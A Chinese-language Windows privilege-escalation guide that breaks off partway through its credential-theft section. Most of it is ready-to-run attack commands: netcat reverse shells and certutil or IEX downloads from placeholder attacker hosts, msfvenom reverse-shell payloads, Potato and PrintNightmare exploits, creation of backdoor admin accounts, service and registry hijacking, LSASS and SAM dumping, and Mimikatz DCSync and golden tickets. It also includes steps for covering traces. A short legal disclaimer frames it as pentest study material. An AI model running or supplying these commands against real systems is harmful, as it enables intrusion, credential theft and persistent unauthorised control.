# Windows 权限提升完全指南

> 从普通用户到 SYSTEM - 基于 2024/2025 最新技术

---

## 目录

1. [Windows 提权概述](#1-windows-提权概述)
2. [信息收集](#2-信息收集)
3. [内核漏洞提权](#3-内核漏洞提权)
4. [服务配置错误](#4-服务配置错误)
5. [注册表提权](#5-注册表提权)
6. [计划任务提权](#6-计划任务提权)
7. [令牌操作](#7-令牌操作)
8. [凭证窃取](#8-凭证窃取)
9. [UAC 绕过](#9-uac-绕过)
10. [自动化工具](#10-自动化工具)
11. [实战案例](#11-实战案例)
12. [常见错误与解决](#12-常见错误与解决)

---

## 1. Windows 提权概述

### 1.1 什么是权限提升？

权限提升（Privilege Escalation）是指从低权限用户获取更高权限的过程。在 Windows 系统中，通常是从普通用户提升到管理员（Administrator）或系统（SYSTEM）权限。

**通俗理解**：就像在公司里，你是普通员工，但通过某些方法获得了 CEO 的权限，可以访问所有机密文件和控制整个公司。

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Windows 权限层级                                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    SYSTEM (最高权限)                         │   │
│  │  • 操作系统内核级别权限                                       │   │
│  │  • 可以访问所有资源                                          │   │
│  │  • 服务和驱动程序运行的权限                                   │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              ▲                                      │
│                              │ 提权目标                             │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    Administrator                             │   │
│  │  • 管理员权限                                                │   │
│  │  • 可以安装软件、修改系统设置                                 │   │
│  │  • 可以管理其他用户                                          │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              ▲                                      │
│                              │ 提权目标                             │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    Standard User (普通用户)                  │   │
│  │  • 有限的权限                                                │   │
│  │  • 只能访问自己的文件                                        │   │
│  │  • 不能修改系统设置                                          │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              ▲                                      │
│                              │ 初始访问                             │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                    Guest / 匿名用户                          │   │
│  │  • 最低权限                                                  │   │
│  │  • 几乎无法做任何事                                          │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 1.2 提权方法分类

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Windows 提权方法分类                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  【内核漏洞】                                                        │
│  • 利用 Windows 内核或驱动程序的漏洞                                │
│  • 如: PrintNightmare, EternalBlue, Potato 系列                    │
│  • 成功率高，但依赖特定版本                                         │
│                                                                      │
│  【配置错误】                                                        │
│  • 服务路径未加引号                                                 │
│  • 服务权限配置不当                                                 │
│  • 文件/目录权限过于宽松                                            │
│  • 注册表权限错误                                                   │
│                                                                      │
│  【凭证相关】                                                        │
│  • 明文密码存储                                                     │
│  • 密码重用                                                         │
│  • 凭证窃取 (Mimikatz)                                              │
│                                                                      │
│  【令牌操作】                                                        │
│  • 令牌模拟 (Token Impersonation)                                   │
│  • Potato 系列攻击                                                  │
│  • 利用 SeImpersonatePrivilege                                      │
│                                                                      │
│  【计划任务/启动项】                                                 │
│  • 可写的计划任务                                                   │
│  • 启动目录写入                                                     │
│  • 自启动注册表项                                                   │
│                                                                      │
│  【UAC 绕过】                                                        │
│  • 绕过用户账户控制                                                 │
│  • 从中等完整性提升到高完整性                                       │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 1.3 Windows 安全机制

```
┌─────────────────────────────────────────────────────────────────────┐
│ Windows 安全机制                                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 1. UAC (User Account Control)                                       │
│    • 限制管理员权限的自动使用                                       │
│    • 需要用户确认才能执行高权限操作                                 │
│                                                                      │
│ 2. 完整性级别 (Integrity Levels)                                    │
│    • System (系统)                                                  │
│    • High (高) - 管理员                                             │
│    • Medium (中) - 标准用户                                         │
│    • Low (低) - 受限进程                                            │
│                                                                      │
│ 3. 访问令牌 (Access Tokens)                                         │
│    • 包含用户 SID、组 SID、权限                                     │
│    • 决定进程可以访问什么资源                                       │
│                                                                      │
│ 4. 特权 (Privileges)                                                │
│    • SeDebugPrivilege - 调试任何进程                                │
│    • SeImpersonatePrivilege - 模拟客户端                            │
│    • SeBackupPrivilege - 备份文件（绕过 ACL）                       │
│    • SeRestorePrivilege - 恢复文件                                  │
│    • SeTakeOwnershipPrivilege - 获取所有权                          │
│                                                                      │
│ 5. Windows Defender / AMSI                                          │
│    • 实时保护                                                       │
│    • 脚本扫描                                                       │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 1.4 法律声明

```
⚠️ 重要提醒 ⚠️

本笔记仅供合法的安全测试和学习使用：

✓ 合法场景：
  • 授权的渗透测试
  • 自己的测试环境
  • CTF 比赛
  • 安全研究

✗ 非法行为：
  • 未授权访问他人系统
  • 恶意提权和破坏
  • 任何违法活动

违法使用将承担法律责任！
```

---

## 2. 信息收集

### 2.1 系统信息

```powershell
# 基本系统信息
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# 主机名
hostname

# 当前用户
whoami
whoami /all          # 详细信息，包括权限和组
whoami /priv         # 当前权限
whoami /groups       # 所属组

# 查看所有用户
net user
net user username    # 特定用户详情

# 查看组
net localgroup
net localgroup Administrators    # 管理员组成员

# 域信息（如果在域中）
net user /domain
net group /domain
net group "Domain Admins" /domain

# 系统架构
wmic os get osarchitecture

# 安装的补丁
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe list full

# 环境变量
set
echo %PATH%

# PowerShell 版本
$PSVersionTable
```

### 2.2 网络信息

```powershell
# 网络配置
ipconfig /all

# 路由表
route print
netstat -rn

# 网络连接
netstat -ano          # 所有连接和监听端口
netstat -ano | findstr LISTENING
netstat -ano | findstr ESTABLISHED

# 防火墙状态
netsh firewall show state
netsh advfirewall show allprofiles
netsh advfirewall firewall show rule name=all

# ARP 表
arp -a

# DNS 缓存
ipconfig /displaydns

# 共享
net share

# 网络驱动器
net use
```

### 2.3 进程和服务

```powershell
# 运行的进程
tasklist
tasklist /v           # 详细信息
tasklist /svc         # 显示服务
Get-Process           # PowerShell

# 查找特定进程
tasklist | findstr "process_name"

# 服务列表
sc query
sc query state= all
net start             # 正在运行的服务

# 服务详情
sc qc servicename     # 服务配置
sc query servicename  # 服务状态

# PowerShell 获取服务
Get-Service
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-WmiObject win32_service | Select-Object Name, State, PathName

# 查找可能有漏洞的服务
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

### 2.4 软件和应用

```powershell
# 已安装软件
wmic product get name,version
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# 32位程序
dir "C:\Program Files (x86)"

# 64位程序
dir "C:\Program Files"

# 注册表中的软件
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

# 查找特定软件
wmic product where "name like '%软件名%'" get name,version
```

### 2.5 敏感文件搜索

```powershell
# 搜索密码文件
dir /s *password* 
dir /s *pass* 
dir /s *cred*
dir /s *.config
dir /s *.ini
dir /s *.txt
dir /s *.xml

# 在文件内容中搜索
findstr /si password *.txt *.ini *.config *.xml
findstr /si pwd *.txt *.ini *.config
findstr /spin "password" *.*

# 常见敏感文件位置
type C:\Windows\System32\config\SAM
type C:\Windows\repair\SAM
type C:\Windows\repair\system
type C:\Windows\System32\config\RegBack\SAM

# Unattend 文件（可能包含密码）
type C:\unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\system32\sysprep\Unattend.xml
type C:\Windows\system32\sysprep\sysprep.xml

# IIS 配置
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

# 其他配置文件
type C:\Windows\System32\inetsrv\config\applicationHost.config

# PowerShell 历史
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# 搜索包含密码的文件
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config,*.xml -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```


### 2.6 计划任务和启动项

```powershell
# 计划任务
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# PowerShell 获取计划任务
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}
Get-ScheduledTask | Get-ScheduledTaskInfo

# 启动项
wmic startup get caption,command
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# 启动文件夹
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

### 2.7 驱动程序

```powershell
# 已安装的驱动
driverquery
driverquery /v

# 第三方驱动（可能有漏洞）
driverquery /v | findstr /i /v "microsoft"

# PowerShell
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
```

---

## 3. 内核漏洞提权

### 3.1 漏洞检测

```powershell
# 查看系统版本和补丁
systeminfo
wmic qfe list full

# 使用 Windows Exploit Suggester
# 首先导出 systeminfo
systeminfo > systeminfo.txt

# 在攻击机上运行
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt

# 或使用 wesng (Windows Exploit Suggester - Next Generation)
python wes.py systeminfo.txt

# Sherlock (PowerShell)
Import-Module .\Sherlock.ps1
Find-AllVulns

# Watson (C#)
.\Watson.exe
```

### 3.2 常见内核漏洞

```
┌─────────────────────────────────────────────────────────────────────┐
│ 常见 Windows 内核漏洞 (2020-2025)                                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ CVE-2024-xxxxx - 最新漏洞（持续关注）                                │
│                                                                      │
│ CVE-2023-36874 - Windows Error Reporting Service                    │
│ 影响: Windows 10/11, Server 2019/2022                               │
│                                                                      │
│ CVE-2023-28252 - CLFS Driver                                        │
│ 影响: Windows 10/11, Server 2019/2022                               │
│                                                                      │
│ CVE-2022-21999 - Print Spooler                                      │
│ 影响: Windows 7-11, Server 2008-2022                                │
│                                                                      │
│ CVE-2021-34527 - PrintNightmare                                     │
│ 影响: Windows 7-10, Server 2008-2019                                │
│                                                                      │
│ CVE-2021-1732 - Win32k                                              │
│ 影响: Windows 10, Server 2019                                       │
│                                                                      │
│ CVE-2020-1472 - Zerologon (域控)                                    │
│ 影响: Windows Server 2008-2019                                      │
│                                                                      │
│ CVE-2020-0787 - BITS                                                │
│ 影响: Windows 7-10, Server 2008-2019                                │
│                                                                      │
│ CVE-2019-1458 - Win32k                                              │
│ 影响: Windows 7-10, Server 2008-2019                                │
│                                                                      │
│ MS17-010 - EternalBlue (经典)                                       │
│ 影响: Windows XP-8.1, Server 2003-2012                              │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.3 PrintNightmare (CVE-2021-34527)

```powershell
# 检查是否存在漏洞
# 检查 Print Spooler 服务状态
Get-Service -Name Spooler

# 检查是否启用了 Point and Print
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"

# 利用方法 1: 使用 Invoke-Nightmare (PowerShell)
# 下载: https://github.com/calebstewart/CVE-2021-1675
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Password123!"

# 利用方法 2: 使用 Python 脚本
# 在攻击机上
python3 CVE-2021-1675.py domain.local/user:password@target '\\attacker_ip\share\malicious.dll'

# 利用方法 3: Metasploit
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
set RHOSTS target_ip
set SMBUSER user
set SMBPASS password
exploit
```

### 3.4 使用预编译的 Exploit

```bash
# 常用 Exploit 仓库
# https://github.com/SecWiki/windows-kernel-exploits
# https://github.com/abatchy17/WindowsExploits

# 下载并传输到目标
# 在攻击机上启动 HTTP 服务器
python3 -m http.server 8080

# 在目标机上下载
certutil -urlcache -f http://attacker_ip:8080/exploit.exe exploit.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker_ip:8080/exploit.exe','C:\temp\exploit.exe')"

# 执行 Exploit
.\exploit.exe
```

### 3.5 Potato 系列攻击

Potato 系列利用 Windows 的令牌模拟机制，从服务账户提权到 SYSTEM。

```
┌─────────────────────────────────────────────────────────────────────┐
│ Potato 系列攻击演进                                                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ Hot Potato (2016)                                                   │
│ └── 利用 NBNS 欺骗和 WPAD                                           │
│                                                                      │
│ Rotten Potato (2016)                                                │
│ └── 利用 DCOM 和令牌模拟                                            │
│                                                                      │
│ Juicy Potato (2018)                                                 │
│ └── Rotten Potato 的改进版                                          │
│ └── 需要 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege    │
│                                                                      │
│ Rogue Potato (2020)                                                 │
│ └── 绕过某些限制                                                    │
│                                                                      │
│ Sweet Potato (2020)                                                 │
│ └── 集成多种技术                                                    │
│                                                                      │
│ PrintSpoofer (2020)                                                 │
│ └── 利用 Print Spooler                                              │
│ └── Windows 10/Server 2016-2019                                     │
│                                                                      │
│ GodPotato (2022)                                                    │
│ └── 最新版本，支持更多系统                                          │
│ └── Windows 8.1-11, Server 2012-2022                                │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

```powershell
# 检查是否有必要的权限
whoami /priv
# 需要: SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege

# JuicyPotato
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe attacker_ip 4444 -e cmd.exe" -t *

# 参数说明:
# -l: 监听端口
# -p: 要执行的程序
# -a: 程序参数
# -t: 创建进程方式 (* = 两种都尝试)
# -c: CLSID (可选，不同系统需要不同的 CLSID)

# 常用 CLSID
# Windows 10: {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
# Windows Server 2016: {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}

# PrintSpoofer
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "c:\temp\nc.exe attacker_ip 4444 -e cmd.exe"

# GodPotato (最新，推荐)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net user hacker Password123! /add"
.\GodPotato.exe -cmd "cmd /c net localgroup administrators hacker /add"

# 反弹 Shell
.\GodPotato.exe -cmd "cmd /c c:\temp\nc.exe attacker_ip 4444 -e cmd.exe"
```

---

## 4. 服务配置错误

### 4.1 服务路径未加引号

当服务的可执行文件路径包含空格且未用引号括起来时，Windows 会按顺序尝试执行路径中的每个部分。

```
┌─────────────────────────────────────────────────────────────────────┐
│ 未加引号的服务路径漏洞原理                                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 服务路径: C:\Program Files\My Service\service.exe                   │
│                                                                      │
│ Windows 尝试执行顺序:                                                │
│ 1. C:\Program.exe                                                   │
│ 2. C:\Program Files\My.exe                                          │
│ 3. C:\Program Files\My Service\service.exe                          │
│                                                                      │
│ 如果我们能在 C:\ 创建 Program.exe，它会被以服务权限执行！            │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

```powershell
# 查找未加引号的服务路径
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell 方法
Get-WmiObject win32_service | Select-Object Name, PathName, StartMode | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -like '* *'}

# 检查路径是否可写
icacls "C:\Program Files\My Service"
accesschk.exe -dqv "C:\Program Files\My Service"

# 利用方法
# 1. 生成恶意程序
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > Program.exe

# 2. 复制到目标路径
copy Program.exe "C:\Program.exe"
# 或
copy Program.exe "C:\Program Files\My.exe"

# 3. 重启服务
sc stop "Vulnerable Service"
sc start "Vulnerable Service"

# 或等待系统重启
shutdown /r /t 0
```

### 4.2 服务权限配置错误

如果普通用户可以修改服务的配置，就可以更改服务执行的程序。

```powershell
# 使用 accesschk 检查服务权限
# 下载: https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula

# 查找可修改的服务
accesschk.exe /accepteula -uwcqv "username" *

# 输出示例:
# RW Vulnerable Service
#   SERVICE_ALL_ACCESS

# 检查特定服务
sc qc "Vulnerable Service"
accesschk.exe -ucqv "Vulnerable Service"

# 利用方法
# 1. 修改服务的二进制路径
sc config "Vulnerable Service" binpath= "C:\temp\malicious.exe"

# 2. 或者添加用户
sc config "Vulnerable Service" binpath= "net user hacker Password123! /add"
sc stop "Vulnerable Service"
sc start "Vulnerable Service"

sc config "Vulnerable Service" binpath= "net localgroup administrators hacker /add"
sc stop "Vulnerable Service"
sc start "Vulnerable Service"

# 3. 恢复原始配置（清理痕迹）
sc config "Vulnerable Service" binpath= "C:\Original\Path\service.exe"
```

### 4.3 服务二进制文件权限

如果服务的可执行文件本身可以被普通用户修改，可以直接替换它。

```powershell
# 检查服务二进制文件权限
icacls "C:\Program Files\Service\service.exe"
accesschk.exe -quvw "C:\Program Files\Service\service.exe"

# 查找所有可写的服务二进制文件
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> services.txt
for /f eol^=^"^ delims^=^" %a in (services.txt) do cmd.exe /c icacls "%a" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%"

# 利用方法
# 1. 备份原始文件
copy "C:\Program Files\Service\service.exe" "C:\temp\service.exe.bak"

# 2. 替换为恶意文件
copy /Y malicious.exe "C:\Program Files\Service\service.exe"

# 3. 重启服务
sc stop "Service Name"
sc start "Service Name"
```

### 4.4 DLL 劫持

当服务或程序加载 DLL 时，如果 DLL 搜索路径中有可写目录，可以放置恶意 DLL。

```powershell
# DLL 搜索顺序
# 1. 程序所在目录
# 2. C:\Windows\System32
# 3. C:\Windows\System
# 4. C:\Windows
# 5. 当前目录
# 6. PATH 环境变量中的目录

# 使用 Process Monitor 查找缺失的 DLL
# 过滤: Result = NAME NOT FOUND, Path ends with .dll

# 查找可写的 PATH 目录
for %A in ("%path:;=";"%") do ( cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo %~A )

# 生成恶意 DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll > malicious.dll

# 放置 DLL
copy malicious.dll "C:\Writable\Path\missing.dll"

# 等待程序加载或重启服务
```


---

## 5. 注册表提权

### 5.1 AlwaysInstallElevated

如果启用了 AlwaysInstallElevated 策略，任何用户都可以以 SYSTEM 权限安装 MSI 包。

```powershell
# 检查是否启用
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 两个都必须为 1 才能利用

# 利用方法
# 1. 生成恶意 MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi > malicious.msi

# 2. 安装 MSI
msiexec /quiet /qn /i malicious.msi

# 使用 Metasploit
use exploit/windows/local/always_install_elevated
set SESSION 1
exploit

# PowerShell 方法
# 使用 PowerUp
Import-Module .\PowerUp.ps1
Write-UserAddMSI
# 生成添加用户的 MSI
msiexec /quiet /qn /i UserAdd.msi
```

### 5.2 注册表服务权限

某些服务的注册表项可能允许普通用户修改。

```powershell
# 检查服务注册表权限
# 使用 accesschk
accesschk.exe -kvuqsw hklm\system\currentcontrolset\services /accepteula

# 或使用 PowerShell
Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\* | Format-List

# 查找可写的服务注册表项
subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services" /display

# 利用方法
# 如果可以修改 ImagePath
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnService" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\malicious.exe" /f

# 重启服务
sc stop VulnService
sc start VulnService
```

### 5.3 自启动注册表项

```powershell
# 检查自启动项权限
accesschk.exe -kvuqsw "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /accepteula
accesschk.exe -kvuqsw "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /accepteula

# 如果可写，添加恶意程序
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\malicious.exe" /f

# 等待用户登录或系统重启
```

### 5.4 Autoruns 检查

```powershell
# 使用 Autoruns 工具检查所有自启动位置
# 下载: https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

# 命令行版本
autorunsc.exe -a * -c -h -s -v -vt

# 检查可写的自启动位置
# 启动文件夹
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
icacls "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# 如果可写
copy malicious.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
```

---

## 6. 计划任务提权

### 6.1 查找可利用的计划任务

```powershell
# 列出所有计划任务
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# PowerShell
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Format-Table TaskName, State, TaskPath

# 查看任务详情
schtasks /query /tn "Task Name" /fo LIST /v

# 检查任务执行的程序权限
# 找到任务执行的程序路径后
icacls "C:\Path\To\Task\Program.exe"

# 查找以 SYSTEM 运行的任务
schtasks /query /fo LIST /v | findstr /i "SYSTEM"

# 查找可写的任务程序
for /f "tokens=*" %a in ('schtasks /query /fo csv ^| findstr /i "running"') do @echo %a
```

### 6.2 利用可写的计划任务

```powershell
# 如果计划任务执行的程序可写
# 1. 备份原始程序
copy "C:\Tasks\scheduled.exe" "C:\temp\scheduled.exe.bak"

# 2. 替换为恶意程序
copy /Y malicious.exe "C:\Tasks\scheduled.exe"

# 3. 等待任务执行或手动触发
schtasks /run /tn "Task Name"

# 如果可以创建新任务（需要权限）
schtasks /create /tn "Backdoor" /tr "C:\temp\malicious.exe" /sc onlogon /ru SYSTEM
```

### 6.3 计划任务脚本注入

```powershell
# 如果计划任务执行的是脚本（.bat, .ps1）且脚本可写
# 检查脚本权限
icacls "C:\Scripts\scheduled.bat"

# 修改脚本添加恶意命令
echo "net user hacker Password123! /add" >> "C:\Scripts\scheduled.bat"
echo "net localgroup administrators hacker /add" >> "C:\Scripts\scheduled.bat"

# 或添加反弹 Shell
echo "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe" >> "C:\Scripts\scheduled.bat"
```

---

## 7. 令牌操作

### 7.1 令牌基础

```
┌─────────────────────────────────────────────────────────────────────┐
│ Windows 访问令牌                                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 访问令牌包含:                                                        │
│ • 用户 SID                                                          │
│ • 组 SID 列表                                                       │
│ • 权限列表                                                          │
│ • 完整性级别                                                        │
│                                                                      │
│ 令牌类型:                                                            │
│ • Primary Token (主令牌) - 进程的身份                               │
│ • Impersonation Token (模拟令牌) - 临时身份                         │
│                                                                      │
│ 模拟级别:                                                            │
│ • SecurityAnonymous - 无法获取客户端信息                            │
│ • SecurityIdentification - 可以获取 SID 和权限                      │
│ • SecurityImpersonation - 可以在本地模拟                            │
│ • SecurityDelegation - 可以在远程模拟                               │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 7.2 令牌模拟

```powershell
# 检查当前权限
whoami /priv

# 关键权限:
# SeImpersonatePrivilege - 模拟客户端
# SeAssignPrimaryTokenPrivilege - 分配主令牌
# SeDebugPrivilege - 调试进程

# 如果有 SeImpersonatePrivilege
# 可以使用 Potato 系列工具（见第3节）

# 使用 Metasploit 进行令牌操作
# 在 Meterpreter 中
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
impersonate_token "DOMAIN\\Administrator"

# 窃取令牌
steal_token <PID>

# 查找有趣的进程
ps
# 找到以高权限运行的进程，窃取其令牌
```

### 7.3 使用 Incognito

```powershell
# Incognito 是一个令牌操作工具
# 可以独立使用或通过 Meterpreter

# 独立使用
incognito.exe list_tokens -u
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe

# Meterpreter 中
load incognito
list_tokens -u
list_tokens -g
impersonate_token "BUILTIN\\Administrators"
```

### 7.4 令牌复制

```powershell
# 使用 PowerShell 复制令牌
# 需要 SeDebugPrivilege

# 获取目标进程的令牌
$process = Get-Process -Name "winlogon" | Select-Object -First 1
$handle = [System.Diagnostics.Process]::GetProcessById($process.Id).Handle

# 使用 Invoke-TokenManipulation
Import-Module .\Invoke-TokenManipulation.ps1
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId (Get-Process winlogon).Id
```

---

## 8. 凭证窃取

### 8.1 Mimikatz

Mimikatz 是最著名的 Windows 凭证提取工具。

```powershell
# 基本使用
mimikatz.exe

# 提升权限
privilege::debug

# 导出所有凭证
sekurlsa::logonpasswords

# 导出 SAM 数据库
lsadump::sam

# 导出域控凭证 (DCSync)
lsadump::dcsync /domain:domain.local /user:Administrator

# 导出所有域用户哈希
lsadump::dcsync /domain:domain.local /all /csv

# 导出缓存的凭证
sekurlsa::msv
sekurlsa::wdigest
sekurlsa::kerberos
sekurlsa::tspkg
sekurlsa::livessp

# 导出 DPAPI 凭证
sekurlsa::dpapi

# Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH /run:cmd.exe

# Pass-the-Ticket
kerberos::ptt ticket.kirbi

# Golden Ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# 一行命令
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# PowerShell 版本 (Invoke-Mimikatz)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### 8.2 其他凭证提取工具

```powershell
# LaZagne - 提取各种应用程序的密码
.\lazagne.exe all

# 提取特定类型
.\lazagne.exe browsers
.\lazagne.exe wifi
.\lazagne.exe windows

# SharpWeb - 提取浏览器凭证
.\SharpWeb.exe all

# SessionGopher - 提取 PuTTY, WinSCP, RDP 凭证
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Thorough

# Seatbelt - 安全审计工具
.\Seatbelt.exe -group=user
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=all
```

### 8.3 SAM 和 SYSTEM 文件

```powershell
# SAM 文件包含本地用户哈希
# 位置: C:\Windows\System32\config\SAM
# 需要 SYSTEM 文件来解密

# 方法 1: 使用卷影复制
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# 方法 2: 使用 reg save
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# 方法 3: 使用 PowerShell
# 需要管理员权限
Copy-Item C:\Windows\System32\config\SAM C:\temp\SAM -Force
Copy-Item C:\Windows\System32\config\SYSTEM C:\temp\SYSTEM -Force

# 在攻击机上提取哈希
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
samdump2 SYSTEM SAM

# 使用 Mimikatz
mimikatz.exe "lsadump::sam /sam:SAM /system:SYSTEM" "exit"
```

### 8.4 LSASS 内存转储

```powershell
# 方法 1: 任务管理器
# 右键 lsass.exe → 创建转储文件

# 方法 2: ProcDump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# 方法 3: comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# 方法 4: PowerShell
# 使用 Out-Minidump
Import-Module .\Out-Minidump.ps1
Get-Process lsass | Out-Minidump

# 在攻击机上分析转储
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

# 使用 pypykatz (Python)
pypykatz lsa minidump lsass.dmp
```

### 8.5 凭证存储位置

```powershell
# Windows 凭证管理器
cmdkey /list
rundll32.exe keymgr.dll, KRShowKeyMgr

# 保存的 RDP 凭证
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
dir %USERPROFILE%\AppData\Local\Microsoft\Credentials\

# WiFi 密码
netsh wlan show profiles
netsh wlan show profile name="WiFi名称" key=clear

# 导出所有 WiFi 密码
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo %j & netsh wlan show profiles %j key=clear | findstr "Key Content")

# IIS 应用池密码
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*

# 组策略首选项密码 (GPP)
findstr /S /I cpassword \\domain.local\sysvol\domain.local\policies\*.xml
